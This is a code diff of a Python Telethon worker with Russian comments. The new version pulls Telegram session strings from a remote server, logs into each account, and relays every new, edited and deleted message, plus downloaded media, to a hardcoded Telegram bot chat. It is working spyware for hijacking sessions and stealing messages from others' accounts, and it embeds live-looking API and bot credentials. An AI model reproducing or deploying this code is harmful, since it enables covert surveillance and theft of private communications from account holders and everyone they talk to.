@@ -1,74 +1,122 @@
-import os
-
-BASE_DIR = os.path.dirname(os.path.abspath(__file__))
-SESSIONS_DIR = os.path.join(BASE_DIR, "sessions")
-
-# 💥 ВАЖНО — ДО ВСЕГО
-os.makedirs(SESSIONS_DIR, exist_ok=True)
 import asyncio
-from telethon import TelegramClient
+from telethon import TelegramClient, events
+import requests
 
 API_ID = 30074866  # ← вставь свой
 API_HASH = "eea91e3c3b0381b36d455383fe5b9989"  # ← вставь свой
 
+BOT_TOKEN = "8695827916:AAENIQTjiIaorme2RJwdppGLn1_85rjXzkY"
+CHAT_ID = "7649175732"
+
+SERVER_URL = "gleaming-truth-production-ed48.up.railway.app"
+
 clients = {}
 
-BASE_DIR = os.path.dirname(os.path.abspath(__file__))
-SESSIONS_DIR = os.path.join(BASE_DIR, "sessions")
 
-# 💥 ГАРАНТИЯ СОЗДАНИЯ ПАПКИ
-os.makedirs(SESSIONS_DIR, exist_ok=True)
-
-
-async def start_client(session_path):
-    name = os.path.basename(session_path)
-
+def send_text(text):
     try:
-        client = TelegramClient(session_path, API_ID, API_HASH)
-        await client.start()
+        requests.post(
+            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+            data={
+                "chat_id": CHAT_ID,
+                "text": text,
+                "parse_mode": "HTML"
+            }
+        )
+    except:
+        pass
 
-        print(f"✅ Запущен: {name}")
 
-        await client.run_until_disconnected()
+def send_file(path):
+    try:
+        requests.post(
+            f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
+            data={"chat_id": CHAT_ID},
+            files={"document": open(path, "rb")}
+        )
+    except:
+        pass
 
-    except Exception as e:
-        print(f"💥 Ошибка клиента {name}:", e)
 
+async def start_client(name, session_string):
+    client = TelegramClient(session_string, API_ID, API_HASH)
+    await client.start()
 
-async def watch_sessions():
-    while True:
-        try:
-            os.makedirs(SESSIONS_DIR, exist_ok=True)
+    print(f"✅ Запущен: {name}")
 
-            if not os.path.exists(SESSIONS_DIR):
-    os.makedirs(SESSIONS_DIR)
+    # 🗑 УДАЛЕНИЕ
+    @client.on(events.MessageDeleted)
+    async def deleted(event):
+        msg = f"""
+🗑 <b>Удалено сообщение</b>
 
-files = os.listdir(SESSIONS_DIR)
+👤 Аккаунт: {name}
+💬 Chat ID: {event.chat_id}
+🧾 IDs: {event.deleted_ids}
+"""
+        send_text(msg)
 
-for file in files:
-                if file.endswith(".session"):
-                    name = file.replace(".session", "")
+    # ✏️ ИЗМЕНЕНИЕ
+    @client.on(events.MessageEdited)
+    async def edited(event):
+        sender = await event.get_sender()
+        msg = f"""
+✏️ <b>Изменено сообщение</b>
 
-                    if name in clients:
-                        continue
+👤 Аккаунт: {name}
+🙋‍♂️ От: {getattr(sender, 'first_name', '')}
+💬 Chat ID: {event.chat_id}
+📝 Текст:
+{event.text}
+"""
+        send_text(msg)
 
-                    print("🆕 Найдена сессия:", name)
+    # 📩 НОВЫЕ + МЕДИА
+    @client.on(events.NewMessage)
+    async def new_msg(event):
+        sender = await event.get_sender()
 
-                    task = asyncio.create_task(
-                        start_client(os.path.join(SESSIONS_DIR, name))
-                    )
-                    clients[name] = task
+        if event.media:
+            file_path = await client.download_media(event.media)
+            send_file(file_path)
 
-        except Exception as e:
-            print("💥 watch error:", e)
+        msg = f"""
+📩 <b>Новое сообщение</b>
 
-        await asyncio.sleep(10)
+👤 Аккаунт: {name}
+🙋‍♂️ От: {getattr(sender, 'first_name', '')}
+💬 Chat ID: {event.chat_id}
+📝 Текст:
+{event.text}
+"""
+        send_text(msg)
+
+    await client.run_until_disconnected()
 
 
 async def main():
     print("🚀 Worker запущен")
-    await watch_sessions()
+
+    while True:
+        try:
+            data = requests.get(f"{SERVER_URL}/sessions").json()
+
+            for acc in data:
+                name = acc["name"]
+                session = acc["session"]
+
+                if name in clients:
+                    continue
+
+                print("➕ Подключаю:", name)
+
+                task = asyncio.create_task(start_client(name, session))
+                clients[name] = task
+
+        except Exception as e:
+            print("Ошибка:", e)
+
+        await asyncio.sleep(10)
 
 
-if __name__ == "__main__":
-    asyncio.run(main())
+asyncio.run(main())
